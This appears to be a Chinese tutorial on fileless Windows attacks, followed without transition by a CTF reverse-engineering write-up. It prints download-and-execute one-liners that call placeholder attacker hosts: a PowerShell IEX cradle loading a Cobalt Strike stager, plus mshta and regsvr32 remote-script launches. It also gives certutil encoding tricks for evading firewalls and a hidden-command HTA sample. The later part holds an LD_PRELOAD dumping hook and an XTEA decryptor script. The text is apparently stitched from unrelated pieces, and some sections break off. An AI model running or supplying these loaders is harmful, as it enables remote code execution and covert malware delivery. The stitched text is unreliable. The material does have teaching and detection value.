## 概念

什么是无文件攻击？

传统恶意软件（例如 \.exe）在感染系统时，通常会把恶意可执行文件写入磁盘，并修改注册表，使某个注册表项指向该文件，以便长期驻留和隐藏。无文件攻击则通常**不向磁盘释放传统可执行文件，而是把恶意脚本或命令放在注册表、WMI、计划任务等位置，或直接在内存中执行**，从而绕过传统杀毒软件主要依赖“扫描磁盘文件判断是否恶意”的检测机制。

无文件落地攻击流程：

1. 远程加载恶意脚本

2. 注入内存

3. 写入注册表（或者自运行）

## 无文件落地攻击常用手法

一般来说在windows的能**执行脚本或命令**的组件都可以用来利用进行无文件落地攻击。

### powershell利用

powershell是微软一种命令行shell程序和脚本环境，使命令行用户和脚本编写者可以利用 \.NET Framework的强大功能。

> PowerShell 是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成。与大多数接受并返回文本的 shell
> 不同的是，PowerShell 构建在 \.NET 公共语言运行时 \(CLR\) 的基础之上，接受并返回 \.NET 对象。
> 这一根本上的改变引入了全新的自动化工具和方法。
> 
> 

总的来说，**powershell和普通 cmd/bash 不一样：它传的不是纯文字，而是“对象”，所以能直接调用系统功能和 \.NET 功能。**

#### 常见手法

这里使用**Cobalt Strike**为例

> Cobalt Strike，是一个商业化的命令与控制（C2）框架，主要给红队做授权渗透测试、模拟高级攻击者用的。它本身是合法工具，但因为功能太强，也被大量攻击者用破解版滥用。
> 
> 

可以理解成：

> 一个“**攻击者的远程控制台**”，用来**生成恶意载荷、投递到目标机器、让目标回连，然后远程操作目标。**
> 
> 

#### 流程

使用 Cobalt Strike **生成一个木马**放在 WEB 中，然后在目标中调用 powershell 远程加载执行我们的恶意 ps1，然后在 cobalt strike 中可以看到已经回连上线了。

1. **Cobalt Strike 生成一个“PowerShell 下载器”**

在 Cobalt Strike 里，红队会创建一个监听器（Listener），比如 HTTP 或 HTTPS，用来**接收目标回连**。

然后使用一个功能，通常叫 Scripted Web Delivery（脚本化 Web 投递）。

这个功能会生成：

- 一个**远程 URL**，比如 `http://你的C2服务器:端口/abc`

- 一段 **PowerShell 命令**，类似这样：

```Bash
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://你的C2服务器:端口/abc'))"
```

注意： 这不是完整可用的恶意命令，只是结构示意。实际中 C2 地址、端口、路径都会变。

这段命令的意思是：

- `powershell`：调用系统自带的 PowerShell。

- `-nop`：不加载配置文件。

- **`-w hidden`**：隐藏窗口。**

- `-c`：执行后面的命令。

- **`IEX`**：Invoke\-Expression，把下载到的字符串当代码执行。**

- **`downloadstring`**：从远程 URL 下载文本内容到内存。**

2. **把生成的脚本/命令放到 Web 服务器**

Cobalt Strike 自己带一个 Web 服务，或者红队会把生成的脚本放到自己的 Web 服务器上。

这个脚本就是“遥控车”的组装说明书，里面包含 Beacon 的加载逻辑。

3. **目标机器执行这条 PowerShell 命令**

目标机器常见执行方式：

- 钓鱼邮件里的宏

- 恶意快捷方式 `.lnk`

- 注册表里藏的命令

- 计划任务

- 或者红队手动在授权测试中执行

一旦执行，目标机器上的 PowerShell 就会去访问那个 URL。

4. **powershell从远程下载脚本到内存**

关键点来了：
`downloadstring` 把远程脚本下载成一个字符串，放在内存里。
**`IEX`** 直接把这个字符串当代码执行。**

磁盘上没有写 \.ps1 文件。

（至少没有传统意义上的恶意可执行文件落地。）

5. **脚本在内存中启动Beacon**

> Beacon 是 Cobalt Strike 植入到目标机器里的“**后门客户端**”，负责主动回连 Team Server，接收命令、执行任务。
> 
> 它不是 Cobalt Strike 软件本身，而是 **Cobalt Strike 生成出来的恶意载荷/植入体。**
> 
> 它可以被包装成：
> 
> - exe
> 
> - dll
> 
> - PowerShell 脚本
> 
> - shellcode
> 
> - Office 宏
> 
> - HTA
> 
> - 等等
> 
> 但核心都是同一套东西：Beacon 代码。
> 
> Beacon 运行在目标机器上后，会做这些事：
> 
> - 定期向 C2 服务器“打电话回家”
> 
> - **检查有没有新任务**
> 
> - **接收命令并执行**
> 
> - **把结果回传**
> 
> - 支持多种通信方式：HTTP、HTTPS、DNS、SMB、TCP 等
> 
> - 可以休眠、可以抖动，用来躲避检测
> 
> 所以它叫 Beacon（信标），因为它像信标一样不断发送信号，告诉 C2：“我还活着，我在线。”
> 
> 



> Beacon与普通后门的区别：
> 
> 传统后门可能是一个 exe，一直挂在进程里，监听端口，等攻击者连进来。
> 
> Beacon 是反向连接：
> 
> - 目标机器主动连 C2
> 
> - 不是 C2 主动连目标
> 
> - 这样更容易穿过防火墙
> 
> 而且 Beacon 很灵活：
> 
> - 可以只存在内存里，不落盘
> 
> - 可以注入到合法进程里
> 
> - 可以伪装成正常流量
> 
> - 可以配置睡眠时间，比如每 60 秒才通信一次
> 
> 



下载下来的脚本会在内存里做这些事：

- 解密/解码真正的 Beacon 载荷

- 可能用反射加载（reflective loading）把 DLL 或 shellcode 加载进内存

- 启动 Beacon

- Beacon 主动回连 Cobalt Strike 的监听器



6. **Cobalt Strike 界面显示“上线”**

“上线”就是 Beacon 成功回连了。

红队在自己的 Cobalt Strike 客户端里看到目标机器出现，就可以：

- 执行命令

- 上传下载文件

- 提权

- 横向移动

- 等等

而目标磁盘上，可能只有一个合法的 `powershell.exe` 在跑。



无文件落地体现在哪里？

- 没有把恶意 `.exe` 写到磁盘。

- 没有把恶意 `.dll` 写到磁盘。

- 没有把恶意 `.ps1` 保存成文件。

- 恶意代码主要在内存里。

- 用的是系统自带的合法程序 `powershell.exe`。

杀软传统上重点扫**磁盘文件**，所以这种玩法更容易绕过。

> 总的来说就是：
> 
> **Cobalt Strike 是遥控器，PowerShell 是合法通道，Beacon 是内存里的遥控车，上线就是车连上遥控器了。**

### Mshta\.exe利用

`Mshta`全称`Microsoft HTML Application Host`（微软 HTML 应用程序宿主）。

HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接**将HTML保存成HTA的格式，就是一个独立的应用软件**，与VB、C\+\+等程序语言所设计的软件界面没什么差别。

大多数的Windows操作系统都**支持Hta文件执行**，**利用Mshta\.exe解析\.hta文件执行，这里的\.hta文件可以是本地的也可以是可访问的远程主机上的。**

HTA虽然用HTML、JS和CSS编写，却**比普通网页权限大得多**。它具有桌面程序的所有权限（读写文件、操作注册表等）。HTA本来就是被设计为桌面程序的。

> 打个比方：
> 你平时用 Chrome 或 Edge 浏览器打开 `.html` 网页，浏览器是个“安全笼子”，网页在里面只能看看图、填填表，绝对不许随便删你电脑里的文件。
> 
> 但是，如果你想**让网页代码（HTML\+JS）拥有和正常软件一样的权限**（能读写文件、能改注册表、能运行别的程序），怎么办？
> 微软就搞了个 `mshta.exe`。它就是一个“摘掉安全笼子”的浏览器。
> 
> 正常用途：
> 双击一个 `.hta` 文件，`mshta.exe` 就会运行它，把它当作一个桌面软件来跑。
> 
> 关键点：
> `.hta` 文件虽然后缀是 `.hta`，但里面其实就是 HTML 和 JavaScript/VBScript 代码。
> 
> 

#### Eg

```XML
<html>
<head>
<script>
s = new ActiveXObject("WScript.Shell");
s.run("%windir%\\System32\\cmd.exe /c calc.exe", 0);
window.close();
</script>
</head>
</html>
```

- `new ActiveXObject("WScript.Shell")`：这是“魔法开关”。普通网页里写这个会被浏览器拦截，但在 `.hta` 里，`mshta.exe` 允许它。**这行代码创建了一个能操作系统的“外壳”对象。**

- `s.run("...cmd.exe /c calc.exe", 0)`：用上面创建的外壳，悄悄（后面的 `0` 表示隐藏窗口）**运行命令提示符 **`cmd`**，并让 cmd 执行 **`calc.exe`**（打开计算器）**。

- `window.close()`：打开完计算器后，把 HTA 窗口关掉，让我们察觉不到。

#### 攻击流程

如果是本地双击 `.hta`，那还是把 `.hta` 文件写到了磁盘上，不算无文件落地。

攻击者命令

```Plain Text
mshta.exe http://攻击者服务器/evil.hta
```

1. 攻击者诱骗你**执行这条命令**（可能是通过钓鱼邮件附件、恶意快捷方式，或者是一段 PowerShell 脚本）。注意，磁盘上根本没有 `evil.hta` 文件，只有一个远程 URL。

2. 你电脑里的 `mshta.exe`（系统自带的合法程序，微软签名的）启动了。

3. `mshta.exe` 去 `http://攻击者服务器/evil.hta` **下载网页代码到内存**。

4. `mshta.exe` **在内存里直接解析里面的 JavaScript/VBScript 代码**。

5. 代码在内存里启动下一步载荷（比如 Cobalt Strike 的 Beacon），向攻击者“上线”。

6. 整个过程，磁盘上只看到合法的 `mshta.exe` 在跑，没有任何可疑的 `.exe` 或 `.hta` 文件被保存下来。

这就叫“无文件落地攻击”。 用的正是系统自带的白名单程序（`mshta.exe`）来借刀杀人。

#### 分析

如果拿到一个可疑的机器，或者分析一个恶意样本，看到 `mshta.exe`，要重点关注以下几点：

1. 看进程树（父进程）：
`mshta.exe` 的父进程是谁？如果是 `winword.exe`（Word 宏）、`excel.exe`、`outlook.exe`（钓鱼邮件），或者某个奇怪的脚本，极度可疑。正常的 HTA 文件应该是用户自己双击才运行的。

2. 看命令行参数：
如果命令行里带有 `http://` 或 `https://` 开头的 URL（例如 `mshta http://...`），这就是典型的远程无文件加载。

3. 抓网络流量：
用 Wireshark 或 Sysmon，看 `mshta.exe` 请求了哪个 IP，下载了什么东西。你可以直接用浏览器去访问那个 URL，把 `.hta` 源码下载下来。

4. 静态分析源码：
下载下来的 `.hta` 其实就是个网页源码。用文本编辑器打开，找到里面的 `<script>` 标签，看它怎么混淆的、怎么解密下一阶段载荷的。

5. 内存取证：
如果它已经运行过了，用 Volatility 去 dump `mshta.exe` 的内存，看看里面藏了什么解密的脚本或 C2 地址。

### regsvr32\.exe利用

Regsvr32命令 用于注册COM组件，是Windows系统提供的**用来向系统注册控件或者卸载控件的命令**，以命令行方式运行。

WinXP及以上系统的regsvr32\.exe在windowssystem32文件夹下；2000系统的regsvr32\.exe在winntsystem32文件夹下。

> `regsvr32.exe`，专门用来注册 DLL 组件。可以把它想象成一个“办事员”，它的工作就是把你提供的 `.dll` 文件，登记到系统的注册表里，**让系统后续能调用它**。
> 正常操作是：`regsvr32 /s MyDll.dll`。
> 
> 

攻击者的思路：
Windows 系统里还有一个官方自带的组件叫 `scrobj.dll`（Microsoft 脚本组件运行库）。微软设计它，是为了让 **`.sct`**（Windows 脚本文件）能像 COM 组件一样被调用**。

> 攻击者就利用了这一点：让“办事员”（regsvr32\.exe）去加载“内鬼”（scrobj\.dll），然后让内鬼去**解析执行一个包含恶意代码的 **`.sct`** 脚本文件**。 加上 `/i:http://...` 参数，这个内鬼还能直接**从远程 URL 拉取脚本，在内存里执行。**
> 
> 

#### 语法

```Bash
regsvr32 [/u] [/s] [/n] [/i[:cmdline]] <Dllname>

/u    Unregisters server.
/s    Prevents displaying messages.
/n    Prevents calling DllRegisterServer. This parameter requires you to also use the /i parameter.
/i:<cmdline>    Passes an optional command-line string (cmdline) to DllInstall. If you use this parameter with the /u parameter, it calls DllUninstall.
<Dllname>    The name of the .dll file that will be registered.
/?    Displays help at the command prompt.
```

- `/s`：阻止显示消息，成功和失败都不弹窗。

- `/u`：反注册服务器，即卸载。

- `/n`：**不调用 **`DllRegisterServer`**。这个参数要求必须同时使用 **`/i`** 参数。**

- `/i:<cmdline>`：将可选的命令行字符串传递给 `DllInstall`。如果配合 `/u`，就调用 `DllUninstall`。

> 普通的 DLL 里有个 `DllInstall` 函数。加上这个参数，就是让办事员去执行这个特殊函数，并且允许把后面的字符串（比如：一个网址）塞给它当执行参数。
> 
>

#### \.sct

`regsvr32.exe` 不仅能加载二进制的 `.dll` 文件，还能配合系统的“内鬼”组件，去解析纯文本的 `.sct` 脚本文件。

`.sct`文件必须是XML文件格式，要执行命令可以参考如下：

SCT文件（**实际上是XML文件**）中具有一个注册标记，**其中可以包含**`VBScript`**或**`JScript`**代码**。

请注意，该文件可以**具有任何扩展名**。它不一定是\.sct，但是该技术围绕SCT文件的使用和Windows脚本组件服务而构建。

##### 对比

对比`.dll`和`.sct`

- 用 `.dll` 打：攻击者需要写 C\+\+ 代码，用编译器编译成 `.dll` 二进制文件，再想办法传到目标机器上，或者远程下载，再让 `regsvr32` 去执行。被杀软拦截的概率大。

- 用 `.sct` 打：攻击者只需要写一个文本文件（甚至直接用 Cobalt Strike 一键生成），把它放在自己的 Web 服务器上。然后执行一条命令：
`regsvr32.exe /s /u /n /i:http://攻击者IP/evil.sct scrobj.dll`

### certutil\.exe的利用

Certutil\.exe 是命令行程序，**作为证书服务的一部分进行安装**。你可以使用 certutil\.exe 来转储和显示证书颁发机构 \(CA\) 配置信息、配置证书服务、备份和还原 CA 组件以及验证证书、密钥对和证书链。

如果 certutil 在没有其他参数的证书颁发机构上运行，则它将显示当前的证书颁发机构配置。**如果在非证书颁发机构上运行 certutil，则该命令默认为运行 certutil \[\-dump\] 命令。**

> 简单来说就是：
>

#### 问题及原理

1. 为什么需要“编码”和“解码”？

假设你是一个黑客，你想把一个木马（`evil.exe`）传到受害者电脑上。

- 如果直接传 `evil.exe`，网络防火墙一看：“这是个可执行文件，大概率是病毒！”直接拦截。

拿出 `certutil`：
攻击者在自己电脑上执行（编码）：
`certutil -encode evil.exe evil.txt`

- 原理：把危险的 `evil.exe`，用 Base64 算法，变成一堆乱码英文字母，保存为 `evil.txt`。

- 结果：现在它看起来就是一个纯洁无瑕的文本文件，防火墙大概率放行。

目标机器把 `evil.txt` 下载下来后，执行（解码）：
`certutil -decode evil.txt evil.exe`

- 原理：把乱码文本 `evil.txt` 还原成原本的 `evil.exe`。

- 结果：木马在受害者电脑上现原形了。

##### `LD_PRELOAD` 钩子法

- 原理：类似于 Windows 下的 API Hook（拦截 API）。程序**在内存里解密出一个完整的 ELF（**`memfd`**），准备调用 **`fexecve`** 执行。我们用假函数拦截，在它执行前把内存文件直接读出来。**

在 Windows 里，如果程序在内存里解密了一个 DLL，然后调用 `LoadLibrary` 加载它，你可能会用 Frida 或者 Detours 去 Hook `LoadLibrary`，在它加载前把内存 Dump 出来。

##### Exp

写钩子文件：

```C++
cat > shim.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>

int fexecve(int fd, char *const argv[], char *const envp[]) {
    static int (*real)(int, char *const *, char * const *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "fexecve");

    char p[64]; snprintf(p, sizeof p, "/proc/self/fd/%d", fd);
    int in = open(p, O_RDONLY), out = open("/tmp/stage2.bin", O_WRONLY|O_CREAT|O_TRUNC, 0755);
    char buf[65536]; ssize_t n;
    **while ((n = read(in, buf, sizeof buf)) > 0) write(out, buf, n);**
    close(in); close(out);

    return real(fd, argv, envp);
}
EOF
```

1. `int fexecve(int fd, char *const argv[], char *const envp[])`：
这就是我们伪造的函数。**它的名字、参数、返回值必须和系统真正的 **`fexecve`** 一模一样**，才能骗过程序。

```Bash

```

利用这个命令 我们能看到系统真正的fexecve参数名字等等 就能抄入我们钩子文件中假的fexecve

![](/images/内存加载_无文件落地/a0c1764f8903271dd8ff9a0d14342112.png)

2. `static int (*real)(...) = NULL;`：
定义一个函数指针，准备存真正的 `fexecve`。

> 如果我们写的假 `fexecve` 不调用真函数，程序就会卡在内存里，无法执行真正的 stage2，程序就死掉了。
> 我们用 `dlsym(RTLD_NEXT, "fexecve")` 找到系统真正的 `fexecve` 地址（类似于 Windows 的 `GetProcAddress`），在 Dump 完内存文件后，必须把执行权交还给系统。
> 
> 

3. `if (!real) real = dlsym(RTLD_NEXT, "fexecve");`：
等价于 Windows 的 `GetProcAddress(GetModuleHandle("libc.so"), "fexecve")`。 

它的意思是：“系统底层真正的 `fexecve` 在哪儿？把地址给我，我一会儿去调它。”

4. `char p[64]; snprintf(p, ..., "/proc/self/fd/%d", fd);`：
这是 Linux 的神奇特性。

原本：**`memfd_create`** 创建的文件：没有磁盘路径，只存在于内存（页缓存）里**。它没有名字，只有一串数字 ID `/proc/self/fd/3` 就是一个指向当前进程文件描述符 3 的“快捷方式”。我们可以像读普通文件一样读它。**`fd`** 就是程序准备执行的“内存文件”的句柄。**

5. `int in = open(p, O_RDONLY), out = open("/tmp/stage2.bin", O_WRONLY|O_CREAT|O_TRUNC, 0755);`：
打开内存文件，并创建 `/tmp/stage2.bin` 准备写入（相当于 Windows 的 `CreateFile`）。

6. `while ((n = read(in, buf, sizeof buf)) > 0) write(out, buf, n);`：
**循环读取内存文件的内容，写入到磁盘文件（这就是 Dump 的过程）**。

7. `return real(fd, argv, envp);`：
文件已经 Dump 完了。**现在调回真正系统的 **`fexecve`**，让程序继续正常执行。**

##### 401562

![](/images/内存加载_无文件落地/image.png)

###### 伪代码分析

1. **PKCS\#7 填充**：

    - `v11 = 8 - (a2 & 7)`：计算需要填充多少字节。如果原数据是 10 字节，`10 & 7 = 2`，`8 - 2 = 6`，需要填 6 个字节。

    - `memset((char *)dest + a2, v11, v11)`：把 `0x06` 填在最后 6 个字节。

2. **初始化 Key 和 IV**：

    - `sub_4012C2(&unk_402010, v8)`：`unk_402010` 就是字符串 `"refinalchallengeemojirev"`，这个函数用来**初始化密钥**。

    - `v7 = 0x76657269666C6D65LL;`：注意这个十六进制数，`65 6D 6F 6A 69 72 65 76` 在内存里倒过来拼就是 `emojirev`，这就是 IV（初始向量）。

3. **CBC 循环加密**：

    - `for (i = 0; i < size; i += 8LL)`：每 8 个字节为一组，进行循环。

    - `*(BYTE*)(dest + i + j) ^= v8[j] ^ 8;`：把明文和前一块密文（或 IV）进行异或（XOR）。（这里的 `^ 8` 可能是 IDA 优化分析时的字节错位，我们按照 CBC 标准逻辑理解即可）。

    - `sub_40131E((char *)dest + i, v8);`：**调用真正的块加密函数**（魔改 XTEA）。就是这里，把 8 字节数据彻底加密。

    - `v7 = *(_QWORD*)((char*)dest + i);`：**把刚加密好的结果存下来，作为下一块异或用的 **`prev`**。**

> CBC（Cipher Block Chaining）是块加密。一个块是 8 字节。
> 它的规则是：当前这一整个 8 字节的明文块，去异或前一个 8 字节的密文块。
> 首块没有前一个密文块，所以去异或 IV（初始向量，也就是那 `emojirev` 8个字节）。
> 
> 

> 假设我们要加密 16 个字节（刚好两块）。
> 
> - `i = 0` 时，是**第一块**（字节 0\-7）。
> 
> - `i = 8` 时，是第二块（字节 8\-15）。
> 
> - `j` 是从 0 到 7，代表**当前块内的第几个字节**。
> 
> 所以 `dest + i + j` 这个看起来很晕的写法，展开来就是：
> 
> - 第一块（i=0）：遍历 j=0\~7，操作 `dest[0]`, `dest[1]` \.\.\. `dest[7]`。
> 
> - 第二块（i=8）：遍历 j=0\~7，操作 `dest[8]`, `dest[9]` \.\.\. `dest[15]`。
> 
> `i + j` 等同于 `i * 8 + j`（因为 `i` 每次加 8，相当于直接加上了偏移量）。它就是用两层循环，遍历内存中连续的每一个字节。
> 
> 

```Java
for (i = 0; i < size; i += 8LL) {     // 外层循环：每次跳 8 个字节，处理一个块
    for (j = 0; j <= 7; ++j)          // 内层循环：处理当前块里的每一个字节（0~7）
        *((BYTE*)dest + i + j) ^= v8[j] ^ 8; // 异或操作
    
    sub_40131E((char *)dest + i, v8); // 把当前块（8字节）扔给 XTEA 函数进行加密
    v7 = *(_QWORD *)((char *)dest + i); // 把刚刚加密完的 8 字节密文存下来，赋给 v7
}
```

#### Exp

现在我们搞清楚了加密环节

- 加密时：明文块 XOR 前一块密文，然后扔进 XTEA 加密。

- 解密时：先把密文块扔进 XTEA 解密，得到的结果再 XOR 前一块密文（首块 XOR IV）。

```Python
#!/usr/bin/env python3
import sys

M = 0xFFFFFFFF
DELTA = 0x9E3779B9

# 密钥来自字符串 "refinalchallengeemojirev" 的前 16 字节
# 注意：小端序读取
KEY_STR = b"refinalchallenge"
KEY = [int.from_bytes(KEY_STR[4*i:4*i+4], 'little') for i in range(4)]

# IV 来自 "emojirev"
IV = b"emojirev"
EMOJI_BASE = 0x1F600

def xt_dec_block(v0, v1):
    # 解密是加密的逆过程，sum 从 (DELTA * 32) 开始，倒着减
    s = (DELTA * 32) & M
    for _ in range(32):
        # 逆操作：先更新 v1（对应加密时的第 15 行）
        # 加密时：v5 += (((v6 >> 5) ^ (16 * v6)) + v6) ^ ...
        # 解密时：v5 -= (((v6 >> 5) ^ (16 * v6)) + v6) ^ ...
        t = ((((v0 << 4) & M) ^ (v0 >> 5)) + v0) & M
        v1 = (v1 - (t ^ ((s + KEY[(s >> 11) & 3]) & M))) & M
        
        s = (s - DELTA) & M
        
        # 逆操作：再更新 v0（对应加密时的第 13 行）
        # 加密时：v6 += (((v5 >> 6) ^ (16 * v5)) + v5) ^ ...
        # 解密时：v6 -= (((v5 >> 6) ^ (16 * v5)) + v5) ^ ...
        t = ((((v1 << 4) & M) ^ (v1 >> 6)) + v1) & M  # 注意这里是 >> 6，魔改点！
        v0 = (v0 - (t ^ ((s + KEY[s & 3]) & M))) & M

    return v0, v1

def read_emojis(path):
    with open(path, "r", encoding="utf-8") as f:
        data = f.read()
    
    vals = []
    for ch in data:
        cp = ord(ch)
        if EMOJI_BASE <= cp <= EMOJI_BASE + 15:
            vals.append(cp - EMOJI_BASE)
            
    if len(vals) % 2 != 0:
        raise ValueError("Emoji 数量不是偶数，文件可能损坏")
        
    ct = bytearray()
    for i in range(0, len(vals), 2):
        ct.append((vals[i] << 4) | vals[i + 1])
        
    return bytes(ct)

def decrypt(ct):
    if len(ct) % 8 != 0:
        raise ValueError("密文长度不是 8 的倍数")
        
    prev = IV
    out = bytearray()
    
    for off in range(0, len(ct), 8):
        block = ct[off:off + 8]
        
        # 小端序读取 v0, v1
        v0 = int.from_bytes(block[0:4], "little")
        v1 = int.from_bytes(block[4:8], "little")
        
        # 魔改 XTEA 解密
        v0, v1 = xt_dec_block(v0, v1)
        
        dec = v0.to_bytes(4, "little") + v1.to_bytes(4, "little")
        # 异或前一块密文（CBC 模式）
        pt = bytes(a ^ b for a, b in zip(dec, prev))
        out.extend(pt)
        
        prev = block # 更新前一块密文
        
    # 去除 PKCS#7 填充
    pad = out[-1]
    if not (1 <= pad <= 8):
        raise ValueError(f"填充错误: {pad}")
    if out[-pad:] != bytes([pad]) * pad:
        raise ValueError("填充校验失败")
        
    return bytes(out[:-pad])

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py enc.txt")
        return
        
    ct = read_emojis(sys.argv[1])
    print(f"[+] 读入密文: {len(ct)} 字节")
    
    pt = decrypt(ct)
    print(f"[+] 解密完成: {len(pt)} 字节\n")
    
    print(pt.decode('utf-8', errors='replace'))
    
    # 自动提取 flag
    import re
    m = re.search(rb"susctf\{.*?\}", pt, re.S)
    if m:
        print("\n[+] 成功拿到 Flag:")
        print(m.group(0).decode('utf-8', 'replace'))

if __name__ == "__main__":
    main()
```
